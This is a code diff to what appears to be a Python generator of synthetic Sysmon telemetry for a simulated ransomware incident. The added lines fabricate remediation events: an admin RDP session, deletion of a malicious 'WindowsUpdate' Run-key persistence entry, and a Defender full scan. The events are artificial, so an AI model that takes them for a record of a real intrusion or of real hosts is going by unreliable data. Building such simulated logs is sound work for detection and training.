+            ts = ts.replace(minute=15, second=10)
+            events.append(sysmon_eid3(ts, target_computer, it_admin_user,
+                                      mstsc_image,
+                                      "tcp", target_ip, random.randint(49152, 65535),
+                                      target_ip, 3389, demo_id=demo_id,
+                                      process_guid=mstsc_guid, process_id=mstsc_pid))
+
+            # 08:30 - Registry cleanup (Delete Run key for WindowsUpdate)
+            reg_image = "C:\\Windows\\System32\\reg.exe"
+            reg_pid = 12300
+            reg_guid = _generate_guid(seed=f"ransom:{target_computer}:reg_cleanup:{day}")
+            ts = ts.replace(minute=30, second=5)
+            events.append(sysmon_eid13(ts, target_computer, it_admin_user,
+                                       reg_image,
+                                       "DeleteValue",
+                                       "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
+                                       malware_path,
+                                       demo_id=demo_id,
+                                       process_guid=reg_guid, process_id=reg_pid))
+
+        if hour == 9:
+            # 09:00 - Full AV scan
+            fullscan_pid = 12400
+            fullscan_guid = _generate_guid(seed=f"ransom:{target_computer}:fullscan:{day}")
+            ts = date_add(base_date, day).replace(hour=9, minute=0, second=20)
+            events.append(sysmon_eid1(ts, target_computer, SYSTEM_USER,
+                                      defender_image,
+                                      '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 2',
+                                      demo_id=demo_id,
+                                      process_guid=fullscan_guid, process_id=fullscan_pid,
+                                      logon_guid=system_logon_guid))
 
     return events
 
@@ -1860,7 +2228,7 @@ def generate_sysmon_logs(
                 exfil_events = generate_exfil_events(start_date, day, hour)
                 day_events.extend(exfil_events)
 
-            if run_ransomware and day == 7:
+            if run_ransomware and day in (7, 8):
                 ransom_events = generate_ransomware_events(start_date, day, hour)
                 day_events.extend(ransom_events)
 
